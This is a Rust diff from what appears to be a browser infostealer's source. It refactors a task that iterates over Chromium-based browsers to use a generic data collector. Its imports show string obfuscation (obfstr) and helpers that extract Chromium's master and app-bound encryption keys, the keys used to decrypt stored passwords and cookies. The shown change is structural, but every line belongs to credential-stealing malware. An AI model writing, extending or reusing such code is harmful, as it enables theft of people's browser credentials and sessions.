@@ -18,17 +18,17 @@ use alloc::borrow::ToOwned;
 use alloc::string::String;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
-use collector::atomic::AtomicCollector;
+use collector::Collector;
 use obfstr::obfstr as s;
 use tasks::{composite_task, CompositeTask, Task};
 use utils::browsers::chromium::{extract_app_bound_encrypted_key, extract_master_key};
 use utils::path::Path;
 
-pub struct ChromiumTask<'a> {
-    tasks: Vec<(ChromiumBasedBrowser<'a>, CompositeTask)>,
+pub struct ChromiumTask<'a, C: Collector> {
+    tasks: Vec<(ChromiumBasedBrowser<'a>, CompositeTask<C>)>,
 }
 
-impl ChromiumTask<'_> {
+impl<C: Collector> ChromiumTask<'_, C> {
     pub(crate) fn new() -> Self {
         let all_browsers = get_chromium_browsers();
         let mut tasks = vec![];
@@ -107,9 +107,8 @@ fn is_in_profile_folder(path: &Path) -> bool {
         .unwrap_or(false)
 }
 
-impl Task for ChromiumTask<'_> {
-
-    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
+impl<C: Collector> Task<C> for ChromiumTask<'_, C> {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         for (browser, task) in &self.tasks {
             let parent = parent / browser.name;
             unsafe { task.run(&parent, collector) }
